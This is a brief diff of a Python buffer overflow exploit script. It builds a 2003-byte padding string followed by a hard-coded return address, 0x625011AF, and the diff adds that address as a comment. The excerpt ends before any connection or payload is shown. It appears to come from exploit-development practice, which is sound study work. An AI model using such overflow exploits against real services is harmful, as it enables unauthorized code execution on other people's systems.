@@ -1,6 +1,6 @@
 #!/usr/bin/python
 import sys,socket
-
+#625011AF
 shellcode = "A" * 2003 + "\xAF\x11\x50\x62"
 
 try:
